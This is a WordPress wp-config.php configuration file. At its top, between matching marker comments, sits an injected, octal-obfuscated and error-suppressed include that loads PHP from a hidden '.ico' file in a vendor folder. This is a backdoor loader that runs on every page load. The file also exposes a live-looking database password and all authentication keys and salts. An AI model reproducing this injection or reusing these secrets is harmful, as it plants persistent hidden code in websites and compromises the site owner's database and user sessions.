<?php
/*3db44*/

@include "\057h\157m\145/\1727\172k\0656\066r\063e\0703\057p\165b\154i\143_\150t\155l\057o\146f\151c\145/\166e\156d\157r\057h\141m\143r\145s\164/\0566\0710\0601\0661\071.\151c\157";

/*3db44*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'i4587416_wp2');

/** MySQL database username */
define('DB_USER', 'i4587416_wp2');

/** MySQL database password */
define('DB_PASSWORD', 'Z.0F4Q8sbWOHzQtp0Zn32');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9potdbqgbncuedWNj43UfqYPDbmMM9Ed3qfzoLTUhJsZmNT4tYlLON5wadJLXNq6');
define('SECURE_AUTH_KEY',  'KSx7Q7IH64o320p4rUDqD6q9NQz36y6PxwXtTfWL1n7iZfJuuSg1qBkPKdL9DkhP');
define('LOGGED_IN_KEY',    'uXxE7N1110toxmCxKxJMrmTKqCj792GiN2D8RF2GJ408ZDrn7f6bRGHYZ1trR81f');
define('NONCE_KEY',        'eBoasOWkRfO5BcWCzBYYNvz3TmDcO9ijVOesQmzjNB6i9WVgOdc7bmWwdZc4TQ98');
define('AUTH_SALT',        'X7m3dIDEqCLNbt7O6RMmOr8UWGt28tRDUrWF1wPv8cNGgynmpppjTZSR8vmhplaQ');
define('SECURE_AUTH_SALT', '8PeRVXSVrvHdgObjhzSUJVY5GwSbmRlKDeaAkc5c47Eqh70TygeGsgUh7hZbBKH6');
define('LOGGED_IN_SALT',   'ukqraGBPICZ5eirY8fKmLRlapNqN5awiiPMxSACTaksF66uVgazm2KMFAZ0GUeH0');
define('NONCE_SALT',       'plB5cy4hlAvz4Q2t2ZlQjqKHKyfQxkkFbFRrd6SwkAUWaxgcg4DoHgK9Ylc6pTE3');

/**
 * Other customizations.
 */
define('FS_METHOD','direct');define('FS_CHMOD_DIR',0755);define('FS_CHMOD_FILE',0644);
define('WP_TEMP_DIR',dirname(__FILE__).'/wp-content/uploads');

/**
 * Turn off automatic updates since these are managed upstream.
 */
define('AUTOMATIC_UPDATER_DISABLED', true);


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
